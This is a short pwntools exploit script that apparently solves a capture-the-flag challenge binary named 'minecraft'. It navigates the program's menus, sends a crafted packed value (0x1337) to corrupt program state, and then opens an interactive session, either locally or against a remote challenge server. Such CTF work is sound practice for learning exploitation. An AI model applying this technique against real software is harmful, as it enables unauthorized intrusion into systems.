from pwn import *

# initialize the binary and set the context (architecture, etc.)
binary = "./src/minecraft" # ensure it is executable (chmod +x)
elf = context.binary = ELF(binary, checksec=False)

gs = """
break main
continue
"""

# run with python3 solve.py REMOTE
if args.REMOTE:
    p = remote("minecraft.chal.cyberjousting.com", 1354)

# run with python3 solve.py GDB
elif args.GDB:
    # having issues with gdb showing up? install and run `tmux` before running this script, then uncomment this:
    context.terminal = ["tmux", "splitw", "-h"]

    p = gdb.debug(binary, gdbscript=gs)

# run with python3 solve.py
else:
    p = elf.process()


### START HERE ###

p.recvuntil(b"username now: \n")
p.sendline(b"urmom")

line = b""
while b"Tag" not in line:
    p.recvuntil(b"Leave\n")
    p.sendline(b"3")
    line = p.recvline()

p.sendline(b"urmom")
p.sendline(p64(0x1337))

p.recvuntil(b"Leave\n")
p.sendline(b"5")
p.recvuntil(b". \n")

p.recvuntil(b"username now: \n")
p.sendline(b"urmom")

p.recvuntil(b"Leave\n")
p.sendline(b"7")

p.interactive()
